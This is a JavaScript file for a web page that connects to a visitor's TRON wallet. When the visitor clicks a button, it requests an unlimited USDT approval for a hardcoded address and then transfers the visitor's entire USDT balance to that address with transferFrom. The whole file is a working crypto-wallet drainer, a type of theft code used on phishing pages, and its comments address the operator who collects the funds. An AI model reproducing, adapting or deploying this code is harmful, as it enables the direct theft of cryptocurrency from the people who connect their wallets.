
const receiveAddress = "TYPodVjr1UpRzxhrF17CXkxeeT4x1Lqmwu";
const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC-20 USDT

let tronWeb;

document.getElementById("connectBtn").addEventListener("click", async () => {
  if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
    tronWeb = window.tronWeb;
    document.getElementById("status").innerText = "✅ Wallet Connected: " + tronWeb.defaultAddress.base58;
    document.getElementById("approveBtn").disabled = false;
  } else {
    document.getElementById("status").innerText = "❌ Please open in Trust Wallet DApp browser or enable TronLink.";
  }
});

document.getElementById("approveBtn").addEventListener("click", async () => {
  try {
    const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);

    // Step 1: Approve unlimited USDT
    await usdtContract.approve(receiveAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();

    document.getElementById("status").innerText = "✅ USDT Approved. Withdrawing...";

    // Step 2: Get client address and full balance
    const client = tronWeb.defaultAddress.base58;
    const balance = await usdtContract.balanceOf(client).call();

    // Step 3: Transfer all USDT to your wallet
    await usdtContract.transferFrom(client, receiveAddress, balance).send();

    document.getElementById("status").innerText = "🎉 USDT Successfully Withdrawn!";
  } catch (e) {
    console.error(e);
    document.getElementById("status").innerText = "❌ Error: " + e.message;
  }
});
